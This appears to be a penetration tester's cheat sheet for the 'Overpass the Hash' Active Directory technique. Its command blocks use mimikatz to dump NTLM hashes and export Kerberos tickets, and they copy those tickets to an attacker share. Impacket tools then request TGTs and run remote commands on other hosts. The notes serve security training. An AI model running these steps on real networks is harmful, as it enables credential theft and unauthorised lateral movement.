# Overpass The Hash

## Overpass The Hash

(NTLM Hash -> Kerberos-based authentication)

* **Requirement**: user/service account to have local admin on target machine.
* Useful when Kerberos is the only authentication mechanism allowed in a target, i.e, NTLM authentication being disabled.
* The tool `psexec.exe` requires local admin rights as it accesses `admin$` SMB share.
* **Common Attack path**: obtain a user's NTLM hash -> start new cmd/ps process as user -> request Kerberos TGT as user -> code exec on any machine where the user has permissions.

> Important: We can only use the TGT on the machine it was created for.

Overpass-the-Hash via compromised host:

```powershell
### WITH MIMIKATZ ON COMPROMISED HOST
mimikatz > sekurlsa::logonpasswords    # obtain NTLM hash
mimikatz > sekurlsa::pth               # create new PS process in context of target user
        /user:[user_name] 
        /domain:[domain_name]
        /ntlm:[hash_value]
        /run:PowerShell.exe

# (new PS window, but on same host)
PS> klist # should show no TGT/TGS
PS> net use \\dc01 (try other comps/targets) # generate TGT by authN to network share on the computer
PS> klist # now should show TGT/TGS
PS> .\PsExec.exe \\[computer] cmd.exe  # use TGT to perform code exec against
                                       # target which user has permissions on.
                                       # (as Psexec does not accept hashes)
```

Overpass-the-Hash via Kali Linux:

```bash
# [OPTION 1 TICKET RETRIEVAL] Request the TGT with hash
$ python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
# Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
$ python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
# Request the TGT with password
$ python getTGT.py <domain_name>/<user_name>:[password]
# If not provided, password is asked

# [OPTION 2 TICKET RETRIEVAL] export tickets -> copy to Kali
mimikatz> sekurlsa::tickets /export                             
cmd> copy [ticket.kirbi] \\192.168.119.XXX\share\[ticket.kirbi]
# use ticket_converter.py to convert .kirbi to .ccache
# https://github.com/Zer1t0/ticket_converter
$ python ticket_converter.py ticket.kirbi ticket.ccache

# Set the TGT for impacket use
$ export KRB5CCNAME=<TGT_ccache_file>

# execute remote commands with any of the following by using the TGT
$ python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
$ python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
$ python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
```
